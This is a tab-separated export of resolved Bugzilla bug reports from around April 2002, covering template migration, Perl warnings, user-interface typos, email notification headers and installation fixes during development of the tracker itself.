136506%TAB%1018369399%TAB%4672%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%can't create new accounts cvs tip 4/8/02%TAB%can't create new accounts cvs tip 4/8/02Description • 23 years ago using: http://n0cgi.distributed.net/bugs/createaccount.cgi?login=foo%40bar.com&realname=foo+bar  cvs tip bugzilla returns:  Content-type: text/html   Software error:  Attempted to send tainted string 'SELECT eventdata FROM tokens WHERE tokentype = 'emailold' AND eventdata like '%:foo@bar.com' OR eventdata like 'foo@bar.com:%'' to the database at globals.pl line 260.
136533%TAB%1018382118%TAB%47651%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%suggestion for ability to do reports of bug counts on any datasets%TAB%suggestion for ability to do reports of bug counts on any datasetsI will hopefully attach some source code where I have modified "reports.cgi" to display tables containing resolution codes etc from what is selected from the listbox on the previous screen.(the one marked "Chart datasets:") NB To make this more acceptable I may be able to make changes (depending on how busy I am at work)
136596%TAB%1018411236%TAB%48628%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Final "." missing in explanation for "INVALID" in queryhelp.cgi%TAB%Final "." missing in explanation for "INVALID" in queryhelp.cgiLine 209 in queryhelp.cgi reads "<li><b>INVALID</b> - The problem described is not a bug"  it should read "<li><b>INVALID</b> - The problem described is not a bug."
136603%TAB%1018413593%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%xml.cgi needs a summary mode,show_bug.cgi's needs a summary mode,show_bug.cgi's XML retreival needs a summary mode,show_bug.cgi's XML retrieval needs a summary mode%TAB%xml.cgi needs a summary mode,show_bug.cgi's needs a summary mode,show_bug.cgi's XML retreival needs a summary mode,show_bug.cgi's XML retrieval needs a summary modebots don't want every comment, and if you don't want to change data via teh xmlrpc stuff we don't support, you may want to use the shadowdb.  We should have either a mode which allows the user to select what fields they want, and/or a nocomments mode for xml output. This would also be useful when we start dumping attachment data.
136751%TAB%1018449314%TAB%34938%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%warning in show_bug.cgi%TAB%warning in show_bug.cgiOn my test system I receive the folowing warning in show_bug.cgi  Argument "" isn't numeric in numeric gt (>) at (eval 42) line 9 (#1) (W  numeric) The indicated string was fed as an argument to an operator that  expected a numeric value instead. If you're fortunate the message will identify  which operator was so unfortunate. [Thu Apr 11 01:25:39 2002]  C:\DL\Devlopment\BugZilla\current\mozilla\webtools\bugzilla\show_bug.cgi:  Argument "" isn't numeric in numeric gt (>) at (eval 42) line 9. [Thu Apr 11  01:25:39 2002]  C:\DL\Devlopment\BugZilla\current\mozilla\webtools\bugzilla\show_bug.cgi:  Argument "" isn't numeric in numeric gt (>) at (eval 42) line 9.
136754%TAB%1018449749%TAB%34938%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%warning in editproduct.cgi if usebuggroups option is on%TAB%warning in editproduct.cgi if usebuggroups option is onif the usebuggroups option is turned on I receive the folowing warning in  editproducts.cgi when I select a product to edit   Use of uninitialized value in substitution (s///) at CGI.pl line 372 (#1) (W  uninitialized) An undefined value was used as if it were already defined. It  was interpreted as a "" or a 0, but maybe it was a mistake. To suppress this  warning assign a defined value to your variables. To help you figure out what  was undefined, perl tells you what operation you used the undefined value in.  Note, however, that perl optimizes your program and the operation displayed in  the warning may not necessarily appear literally in your program. For  example, "that $foo" is usually optimized into "that " . $foo, and the warning  will refer to the concatenation (.) operator, even though there is no . in your 
136827%TAB%1018485269%TAB%48628%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Reporting/Charting%TAB%mailto: value needs appended emailsuffix in describecomponents.cgi and reports.cgi,mailto: value needs appended emailsuffix in reports.cgi%TAB%mailto: value needs appended emailsuffix in describecomponents.cgi and reports.cgi,mailto: value needs appended emailsuffix in reports.cgiI have originally found this bug in report.cgi, "most doomed for milestone", see http://bugzilla.mozilla.org/show_bug.cgi?id=136609 for details.  This is a typical bug of the kind that tends to pop up at several places, so I  did a source code review of 2.14.1.  I asked grep where to look:  wwwrun@develop:/opt/bugzilla-2.14.1> grep -lE 'mailto:.*\$' `find . -type f` ./buglist.cgi ./describecomponents.cgi ./globals.pl ./reports.cgi  From looking at the source code:  buglist.cgi does it right, no bug in that one. describecomponents.cgi does not do it right, so there is an additional bug in  that one. globals.pl does it right, no bug in that one. reports.cgi does not do it right, as was already noticed.  (I repeat reports.cgi here so we can mark 136609 as a duplicate of this one.)
137121%TAB%1018592203%TAB%48628%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%createaccount.cgi emitts "Content-type: text/html" twice,createaccount.cgi emits "Content-type: text/html" twice%TAB%createaccount.cgi emitts "Content-type: text/html" twice,createaccount.cgi emits "Content-type: text/html" twiceOne of the first things createaccount.cgi *always* does is, it clears the  cookies.  In that code, there already is a "Content-type".   Createaccount.cgi then calls CheckEmailSyntax(), which prints "Content-type" a  second time.  That second time is no longer interpreted as a HTTP-Header, so it becomes  visible on the browser screen.
137183%TAB%1018613374%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%userprefs.cgi: tab names should be in the template not in the .cgi%TAB%userprefs.cgi: tab names should be in the template not in the .cgimy @tabs = ( { name => "account", description => "Account settings",                 saveable => "1" },              { name => "email", description => "Email settings",                 saveable => "1" },              { name => "footer", description => "Page footer",                 saveable => "1" },              { name => "permissions", description => "Permissions",                 saveable => "0" } );  The "description" (tab header) should really be in the template/default/pref/userprefs.tmpl. This blocks the translation of the templates: bug 126955 and bug 135604 and is highly user visible.  For the longer term also the error messages need to be moved into a translatable form: DisplayError("I was unable to retrieve your old password from the database."); DisplayError("You did not enter your old password correctly."); DisplayError("The two passwords you entered did not match."); DisplayError("You must enter a new password."); DisplayError("You must enter your old password to change email address."); DisplayError("Email change already in progress; please check your email."); DisplayError("Account $new_login_name already exists"); "An email has been sent to both old and new email addresses to confirm the change of email address."; DisplayError("Hmm, the $name query seems to have gone away.");
137218%TAB%1018625838%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%the email fields on the query form are too small%TAB%the email fields on the query form are too smallThe email fields on the new query form are 20 characters wide.  They used to be 30.  They can be at least 25 without altering the layout of the page and should be at least that wide so there is adequate room for longer email addresses.
137261%TAB%1018660903%TAB%7417%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Email Notifications%TAB%X-Bugzilla-Who: an email header specifying the the bugzilla account that made these changes,X-Bugzilla-Who: an email header specifying the bugzilla account that made these changes%TAB%X-Bugzilla-Who: an email header specifying the the bugzilla account that made these changes,X-Bugzilla-Who: an email header specifying the bugzilla account that made these changesI'd like this header so that I can mark bugmail read if I was the one who made the change, since I probably still remeber what it was that I did.
137589%TAB%1018866721%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%Tinderbox is stuck waiting for input from CGI.pm in process/verify-new-product.html.tmpl%TAB%Tinderbox is stuck waiting for input from CGI.pm in process/verify-new-product.html.tmplAfter Bug 125660 (Templatise process_bug.cgi) was checked in, the t/004template.t template test gets stuck on the following line from the template/default/process/verify-new-product.html.tmpl template:  [% USE mycgi = CGI %]  It is similar to what happens when this is run from the command-line (hit Ctrl-C or Ctrl-D on *NIX to exit):  perl -e 'use CGI; my $query = new CGI;'  There are two fixes for this:  1. Add a line like this to t/004template.t:  use CGI qw(-no_debug);     Because CGI.pm would already be included in the test script,    including it again in the template has no effect, and the    '-no_debug' switch turns off this feature for testing.  2. Change template/default/process/verify-new-product.html to    include the '-no_debug' switch:  [% USE mycgi = CGI('-no_debug') %]  Any preference as to the fix?
137623%TAB%1018876699%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%showdependencytree.cgi has minor grammatical and formatting issues%TAB%showdependencytree.cgi has minor grammatical and formatting issuesThe following two complete sentences appear without periods:    This bug appears elsewhere in this tree.   Only bugs whose depth is less than # will be shown.  The following sentence is redundantly highlighted (italic style and angle brackets):    This bug appears elsewhere in this tree.  The following sentence is redundantly highlighted (bold style and parentheses):    Only bugs whose depth is less than # will be shown.  The following tree meta-data are inside the tree title:    Only bugs whose depth is less than # will be shown.   view as bug list   change several  The depth sentence is misleading and unnecessarily complicated.  It should be:    (up to # levels deep)  Words in the tree titles are not capitalized.  The word "bug" in the expression "bug ####" is not linked.  The "unlimited" link is enabled even when an unlimited number of levels are already being displayed.  The number of levels is displayed even when it is greater than the maximum depth of the tree.
137631%TAB%1018879985%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%status workflow diagram%TAB%status workflow diagramA bugzilla status/workflow diagram would be a useful addition to the Bugzilla documentation.  As well as being a reference for existing Bugzilla users, it would serve as a simple way of comparing Bugzilla to an existing bug tracking system, as most proprietary/inhouse systems will have an equivalent diagram.
137636%TAB%1018880918%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%should not prompt to rebuild the keyword cache after a keyword description change%TAB%should not prompt to rebuild the keyword cache after a keyword description changeWhen I make a change to a keyword description (not the keyword itself) I am prompted to rebuild the keyword cache using sanitycheck.cgi. Since I haven't changed the actual keyword there should be no need to prompt for rebuilding the cache.   On large installations like bmo running sanitycheck.cgi. takes a long time and slows everyone to a crawl while it's running. We should avoid asking the administrator to do something unless it is really necessary.
137669%TAB%1018893868%TAB%11007%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Remove <nobr>%TAB%Remove <nobr>These are all the <nobr> in the whole tree.  Somebody review me.
137709%TAB%1018915815%TAB%49143%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts,Documentation%TAB%Settings for Email Notification do not appear on user screen%TAB%Settings for Email Notification do not appear on user screenFixed.  Checking in docs/sgml/administration.sgml; /cvsroot/mozilla/webtools/bugzilla/docs/sgml/administration.sgml,v  <--  administration.sgml new revision: 1.10; previous revision: 1.9 done 
137751%TAB%1018930225%TAB%34176%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%[RFE] Linkify bug numbers in dependency fields on show_activity.cgi,Linkify bug numbers in dependency fields on show_activity.cgi%TAB%[RFE] Linkify bug numbers in dependency fields on show_activity.cgi,Linkify bug numbers in dependency fields on show_activity.cgiWhen viewing the activity history of a bug, it would be nice to have the bug  numbers which have been added to or removed from the BugsThisDependsOn or  OtherBugsDependingOnThis fields linkified.
137771%TAB%1018938353%TAB%11007%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%downcase element and attribute names and quote attribute values%TAB%downcase element and attribute names and quote attribute valuesBugzilla should be as close to XHTML as possible without breaking HTML 4.01 Transitional.  Elements should be lowercase and attributes should be quoted.
137855%TAB%1018967696%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%classic format for query form%TAB%classic format for query formChanging the user interface of a program is painful for its end users.  The query form recently underwent a major transformation.  The old version of the form should continue to be available to users as an alternative format.
137954%TAB%1019011199%TAB%45469%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Empty "move-button-text" field blocks changing bugs%TAB%Empty "move-button-text" field blocks changing bugsWhen the field "move-button-text" in the parameters is blanked out, every commit on the bug-details page(show_bug.cgi) results in the message  "Sorry. Bug moving is not enabled here. If you need to move a bug, contact ... "  although bug moving is not enabled, i.e. the field "move-enabled" is set to Off.
138023%TAB%1019038854%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installation & Upgrading%TAB%Bundle::Bugzilla needs to be updated to use Template-Toolkit v2.07%TAB%Bundle::Bugzilla needs to be updated to use Template-Toolkit v2.07Bundle::Bugzilla needs to be updated to use Template-Toolkit v2.07.  See Bug 97832 for details.  See also Bug 108581 for the last time Bundle::Bugzilla was updated in preparation for the Bugzilla 2.16 release.  Also, this new Bundle::Bugzilla should be thoroughly tested with Perl v5.00503 as per justdave in #mozwebtools (testing on landfill):  <justdave> Bundle::Bugzilla fails miserably on Perl 5.00503, btw <justdave> I just tried it <justdave> Date::Parse is up to date. <justdave> AppConfig is up to date. <justdave> Template is up to date. <justdave> Text::Wrap is up to date. <justdave> Bundle summary: The following items in bundle Bundle::Bugzilla had <justdave> installation problems: <justdave>   Bundle::DBD::mysql CGI::Carp and the following items had problems during <justdave>   recursive bundle calls: DBD::mysql Data::ShowTable  This may be a bug in other Bundle::* modules, but we need to  document these and/or get the authors to fix the issues before the Bugzilla 2.16 release.
138064%TAB%1019049969%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%False-positive error message in checksetup.pl when checking for "png" in data/webdot/.htaccess%TAB%False-positive error message in checksetup.pl when checking for "png" in data/webdot/.htaccessAttachment 77115 [details] [diff] ("Patch Part 2 v.1") in Bug 120537 corrected a false-positive error message in defparams.pl when checking for "png" in data/webdot/.htaccess.  The same issue exists in checksetup.pl.  Patch to follow shortly.  (Had a hard time locating that bug...resorted to 'cvs annotate'. That'll teach me for not opening a second bug! :^)
138113%TAB%1019066068%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%changing milestone not required when assigning%TAB%changing milestone not required when assigningWhen changing a product and accepting at the same time, it is possible to avoid setting the milestone different from the default, as the default milestone from the old product is used.  Steps to reproduce: 1) Set default milestone for productB to be different to the default milestone for productA. 2) Change bug from productA to productB, and accept. 3) On the change version/component/target form, select the default milestone from step 1.  Expected results: As the default milestone was used during assignment, the following error is expected: "You must determine a target milestone for bug $id if you are going to accept it.  Part of accepting a bug is giving an estimate of when it will be fixed."  Actual results: process_bug proceeded without error.
138284%TAB%1019135498%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Tweak Bugzilla to prepare for simple enter bug template%TAB%Tweak Bugzilla to prepare for simple enter bug templateOver in bug 133559, I'm developing a second template for enter_bug.cgi - the Bugzilla Helper is becoming a template.   Bugzilla needs a tweak or two to support the extra stuff. It is likely that b.m.o will update to 2.16, and stay there. Therefore, to get this on b.m.o, they'll have to apply the patch by hand. So, it would be ideal if these tweaks were part of Bugzilla 2.16, even if the new template isn't.  The tweaks are: - setting the variable user_agent to the user-agent string when we initialise $vars. This is generally useful. - choose-product.tmpl passing the format parameter through to its target. - the simple buglist format saying "Zarro Boogs", instead of nothing, if no bugs are found.  I have simple patches for all of these, but want to discuss whether any of them are controversial first :-)
138312%TAB%1019139602%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Administration%TAB%link to product from components%TAB%link to product from componentsAfter adding/editing components in a product, there is no way to return to the product page, without navigating down through editproducts.  As an initial suggestion, every page from editcomponents.cgi displays the product name, which could become a link to editproducts.
138456%TAB%1019183402%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%adding invalid addresses to CC list results in html error displayed as text,error messages display incorrectly or cause Internal Server Error,adding invalid addresses to CC list results in html error displayed as text%TAB%adding invalid addresses to CC list results in html error displayed as text,error messages display incorrectly or cause Internal Server Error,adding invalid addresses to CC list results in html error displayed as textWhen entering an invalid email address in either the Assigned To or CC input boxes, the error message returned in DBNameToIdAndCheck is displayed without a Content-type header preceeding it.
138546%TAB%1019204216%TAB%25030%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General,attachment and request management%TAB%Need email CC addition option on create attachment page%TAB%Need email CC addition option on create attachment pageIf on first visit to a bug I choose to create an attachment, I get no email CC. I have to go back to bug to do no more that add the CC.
138581%TAB%1019210300%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Add template/en/default and template/en/custom to the template search path%TAB%Add template/en/default and template/en/custom to the template search pathTo migrate from template/default to template/en/default, we need to add template/en/default to the search path.   If we make it so "en" is searched second, we can convert the CGIs one at a time by changing their internal names and CVS-removing the old template. Then, it'll fall through to the new one. This gives us a short-term migration path.  In a few days, hopefully we will remove template/default and template/custom from the search path altogether.  There are no plans to make the search path configurable for 2.16.
138582%TAB%1019210303%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Convert (almost) all INCLUDEs to PROCESSes in templates%TAB%Convert (almost) all INCLUDEs to PROCESSes in templatesPROCESS is faster than INCLUDE; where we don't need the aliasing behaviour of INCLUDE, we should use PROCESS. This is a search-and-replace job, basically - there's only about one place we need INCLUDE - that's in dependency-tree.html.tmpl.
138588%TAB%1019210828%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Convert CGIs to call new templates%TAB%Convert CGIs to call new templatesWe need to convert all the templatised .cgi and .pl files to use the new templates  in template/en/default. After we check in bug 138581, which adds this to the search path, we can do them a few at a time.  The procedure is to change the CGI and then, if the template has retained the same name and path across the move, delete (and cvs remove) the old templates it referenced.  This bug may turn into a tracking bug if we need several bugs to accomplish this.
138604%TAB%1019213512%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Make the Bugzilla Sidebar use valid XUL%TAB%Make the Bugzilla Sidebar use valid XULFiling this as a blocker since we should fix this before the intial release of the sidebar (2.16), but I have a patch to fix this, and some additional cleanup on the file.  Before I attach the patch though, has anyone seen the sidebar lately?  Are the blue link underlines going across the whole sidebar per the design?  Should we change that?  And anyway, why are we using XUL to begin with?  Can't we just use HTML/XHTML, but still restrict its usage to Mozilla only?
138699%TAB%1019239571%TAB%25030%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%Additional Comments/Bug Description at 11 Lines Vertical is Unnecessarily Short%TAB%Additional Comments/Bug Description at 11 Lines Vertical is Unnecessarily ShortForm input field for description (original bug) and additional information (existing bug) is smaller than there is any reason for it to be. Composing anything of substance requires more visible than is currently possible without scrolling. Input field should maximize at very nearly full browser height and width. On my 800 X 600 screen could fit probably at least 20 lines comfortably.
138701%TAB%1019240292%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%bugzilla.org%TAB%Developers' guide update for new template procedures.%TAB%Developers' guide update for new template procedures.We need to fully document in the developers' guide the things we have decided for templates for 2.16.  These include:  - extensions (I believe this is correct in the guide already ...) - basename nameing conventions (verb-object?) - use of PROCESS/INCLUDE/etc - use of filters (uri, html, url_quote etc) - everything else we have fixed up recently  Please summarise what needs to be done below.
138903%TAB%1019324200%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Document enter_bug/post_bug templates.%TAB%Document enter_bug/post_bug templates.We should document the new enter_bug/post_bug templates feature for 2.16.
138904%TAB%1019324529%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Should post_bug templates be separate?%TAB%Should post_bug templates be separate?My issue is that there is only one post_bug template, comment.txt.tmpl, whereas there can be multiple enter_bug formats.  Now at first glance this might not matter, as you can use product determination in comment.txt.tmpl to distinguish comment templates.  However, I can imagine people wanting to redistribute there changed templates, and this essentially prohibits this action.  Because they are all in one file, it is possible to slot a new enter_bug template into default but not a new post_bug template, and therefore editing will always be required.  I would much prefer if you could slot in templates.  So basically each enter_bug template would pass a format name through to post_bug.cgi and post_bug.cgi would call the appropriate comment-format.txt.tmpl.  The normal template would be comment-simple.txt.tmpl or comment-unprocessed.txt.tmpl.  This strikes me as easy for 2.16, and I think its worth doing before our first release of this feature.
138994%TAB%1019376766%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%Split duplicates.html.tmpl up%TAB%Split duplicates.html.tmpl upWe need to make it possible to see only the table of duplicates.html.tmpl by using "format=simple"; this means the template needs splitting and format support needs adding.  This is required because the simple duplicates table goes in an IFRAME on the new simple enter-bug template.
138995%TAB%1019376827%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Split up search.html.tmpl%TAB%Split up search.html.tmplThis template needs splitting up into bits. I want to be able to reuse the central section in my chart query definition UI.  It's good to do this ASAP because it's not hard to do now, but it's much harder when there are a lot of custom templates out there.
139011%TAB%1019381077%TAB%21544%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%Improve buglist colors further%TAB%Improve buglist colors furtherOne thing that would be great if it was added to bugzilla (at least on mozilla.org), was if resolved bugs would get a "greyed-out" sort of "disabled" color; just like critical or blocker bugs become sparkling red. :-)  I have a bookmark, "Today's bugs", and when I go to that query, I often see some new major bugs, some already resolved (as invalid or duplicate or whatever), and as you can see, it would be really useful if I could quickly note (by color) when a bug is already resolved.
139051%TAB%1019394592%TAB%49205%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Two typos%TAB%Two typosFirst, on the "Edit user" page, it says "User has these priveleges".  It should be "privileges".  Second, after adding a component to a product, the confirmation page has a double period, like so: "End of sentence.."
139309%TAB%1019482183%TAB%19073%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Email Notifications%TAB%Include user name in bugmail,Include real name (not just email address) in bugmail comment and diff headers%TAB%Include user name in bugmail,Include real name (not just email address) in bugmail comment and diff headersA minor tic, but bugmail only contains email addresses, whereas bugzilla only contains the user name as visible (with email as the link target). More often than not I find myself getting lost trying to associate a bugmail with the comment on the actual HTML bug report.  Expected behaviour: add something in bugmail to indicate both email addres + username
139313%TAB%1019482792%TAB%34938%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%fatal warning in buglist.cgi%TAB%fatal warning in buglist.cgiOn my test system the folowing code in buglist.cgi when i select the "my bugs"  query  if (trim($::FORM{'votes'}) && !grep($_ eq 'votes', @displaycolumns)) {     push(@displaycolumns, 'votes'); }  generate a warning  [Tue Apr 23 00:30:47 2002] C:\Projects\bugzilla\Current\buglist.cgi: Use of  uninitialized value in substitution (s///) at globals.pl line 1587. Use of uninitialized value in substitution (s///) at globals.pl line 1588 (#1) [Tue Apr 23 00:30:47 2002] C:\Projects\bugzilla\Current\buglist.cgi: Use of  uninitialized value in substitution (s///) at globals.pl line 1588. Content-Disposition: inline; filename=bugs-2002-04-23.html  Unfortunatly this warning corupt the HTML generated and the page is not  displayed corectly
139542%TAB%1019557733%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%"Back to bug" link broken on show_activity.cgi page%TAB%"Back to bug" link broken on show_activity.cgi pageThe "Back to bug" link at the bottom of the show_activity.cgi page is broken. For show_activity.cgi?id=1 , it should point to show_bug.cgi?id=1 . Instead, it is pointing to show_bug.cgi?id=  without the id filled in. Should be trivial to fix.
139588%TAB%1019566770%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%TT 2.07 problem: newly added columns are only one (1) character wide%TAB%TT 2.07 problem: newly added columns are only one (1) character wideNewly added columns (via "Change Columns" link on buglist.cgi) have their content values displayed only up to a width of a single character (*1* character) if you use TT 2.07. According to myk it works fine on TT 2.06.
139632%TAB%1019580242%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%ConnectToDatabase misuse,ConnectToDatabase misuse - partial fix for 2.16%TAB%ConnectToDatabase misuse,ConnectToDatabase misuse - partial fix for 2.16We call ConnectToDatabse() in a whole lot of places. Instead, we should only do so at the top of scripts. Currently, we have the problem noted on landfill where if you try to enter a bug when you're not logged in, and we're scheduled rebuild the versioncache, then we clear the token table first. Rebuilding the versioncache calls ConnectToDB, and if you're logged in with a non-0 groupset we call userInGroup, which also connects to the db.  The token code doesn't, and so we fail when making a db query to do the updates  This is thus a 2.16 blocker.  The easy solution is just to always connectToDatabase at the top of scripts, and never anywhere else. This will cause a sperious connection on pages which don't otherwise need the versioncache, when a person isn't logged in (wince then we wouldn't need them for the footer, either). I think that the product selection part of enter_bug.cgi is the only one of those we have, so I think we can live with that...  This blocks the replication bug, bug 124589, because there I've changed ConnectToDatabase() to mean 'connect to the real db' instead of the current behaviour of returning if we already have a connection. Yes, I could make ConnectoToDatabase with no args only connect if we're not connected, but I think that its easier to just remove the calls from helper functions, which are scattered thoguhtout the code, as seen from the current issue with enter_bug.  MattyT has longer-term plans for a transaction API. Those shouldn't affect this, though.
139759%TAB%1019627799%TAB%26184%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%'Any of: CC list member' causes problems if used with 'Any of: bug owner'%TAB%'Any of: CC list member' causes problems if used with 'Any of: bug owner'It seems that if I choose 'Any of bug owner OR CC list member IS user' in the query screen I only get back bugs that I am on the CC list for and not getting the ones where I am the bug owner and there is nobody on the CC list.  I have net yet been able to trace the code and patch it to work correctly, but it seems that the cause is that the join between the bugs and cc tables eliminates any bug that does not have a user on the CC list from the result set.
139783%TAB%1019631973%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%The LDAP part of the docs are in the win32 installation section%TAB%The LDAP part of the docs are in the win32 installation sectionThe LDAP part of the docs are in the win32 installation section
139800%TAB%1019636260%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Change references to index.html to index.cgi%TAB%Change references to index.html to index.cgiThese files still reference index.html, which won't even exist unless the user chooses to create a dummy file that redirects to index.cgi:    robots.txt   queryhelp.cgi  Patch to follow shortly.  Bug 80183 was the original bug filed to creage the index.cgi file.  The actual patch checked in was in Bug 37339, though.
139928%TAB%1019663119%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%remove templates from template/default/%TAB%remove templates from template/default/Now that templates have been moved to the template/en/ hierarchy they should be removed from template/default/.
139930%TAB%1019663553%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup.pl fails if data/params doesn't exist%TAB%checksetup.pl fails if data/params doesn't existBug 126571 went in, but that requries data/parmas without checking that it exists.  that block should be wrapped in an |if (-e 'data/params')| check  Note that if it does exist, the graphviz check will have brought it in earlier. Thats a separate very minor optimisation issue, though  2.16 blocker, since we do want new installations to work
140006%TAB%1019703368%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%ThrowTemplateError should try the error template first%TAB%ThrowTemplateError should try the error template firstCurrently, ThrowTemplateError assuems that we're doomed. This means that we get a plain error no matter what went wrong. We should try to use the error template, and give a nicely formatted error, and only fall back to untemplated output as a last resort.
140103%TAB%1019728710%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Templatisation odds and ends%TAB%Templatisation odds and endsI just had a change to grep the sources for places where templatisation is still needed for user-facing stuff. We can't really avoid doing it; not having it causes bugs like bug 137121, and it causes trouble for our localisers.  The good news is that it's not all that complicated - just a little bit long-winded. It's mostly in CGI.pl. I'll split the patch into several pieces to make it easier to review.
140110%TAB%1019729741%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Remove redundant code from CGI.pl%TAB%Remove redundant code from CGI.plPost-templatisation, there is a _load_ of redundant code in CGI.pl that no-one uses. Given that this file is instantiated every time we run a CGI, removing it all must be a perf win of some sort. And it also makes what's going on a lot clearer.
140121%TAB%1019731191%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%We need to start calling SyncAnyPendingShadowChanges again%TAB%We need to start calling SyncAnyPendingShadowChanges againPutFooter() calls SyncAnyPendingShadowChanges. The footer template doesn't. When PutFooter() goes away entirely, this function will never get called. That's probably bad.
140124%TAB%1019732132%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%PuntTryAgain must die%TAB%PuntTryAgain must dieThere's only one call left, in process_bug.cgi. Kill it, and we can remove PuntTryAgain completely.
140145%TAB%1019737278%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%GetLongDescriptionAsHTML must die%TAB%GetLongDescriptionAsHTML must dieIt's in globals.pl, and not used anywhere any more.
140161%TAB%1019740606%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%SyncAnyPendingShadowChanges call in footer.html.tmpl displays 0%TAB%SyncAnyPendingShadowChanges call in footer.html.tmpl displays 0Calling SyncAnyPendingShadowChanges at the bottom of footer.html.tml displays the number zero on landfill.  This is because TT displays the return value of the function call.
140311%TAB%1019800654%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%query.cgi, search/seach.html.tmpl: should move some strings to template%TAB%query.cgi, search/seach.html.tmpl: should move some strings to templateThese strings should be moved to the template:   my @orders = ('Bug Number', 'Importance', 'Assignee', 'Last Changed');   $deforder = "Reuse same sort as last time";   $default{'chfieldto'} = ["Now"];   "[Bug creation]" Especially "Now" and @orders (with deforder) should be translateable. (I came accross them while attempting create a German template translation)
